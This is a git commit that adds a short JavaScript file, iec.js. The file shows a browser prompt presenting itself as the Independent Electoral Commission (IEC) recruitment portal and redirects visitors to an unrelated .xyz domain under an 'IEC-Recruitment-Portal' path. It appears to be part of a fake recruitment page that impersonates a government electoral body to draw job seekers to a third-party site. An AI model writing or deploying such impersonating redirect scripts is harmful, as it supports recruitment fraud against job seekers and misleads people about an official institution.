8cd4ad3b7b388aca7f6787fed7fcc0ce41128d96
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-06 20:48:42 +0100

    Create iec.js

---
+++ iec.js
@@ -0,0 +1,6 @@
+
+var password = 'The Independent Electoral Commission (IEC)'
+password=prompt('IEC: Welcome to our recruitment portal,click OK to submit your application','The Independent Electoral Commission (IEC)');
+if (password != 'The Independent Electoral Commission (IEC)') {
+location.href='https://www.udwang.xyz/IEC-Recruitment-Portal';
+}
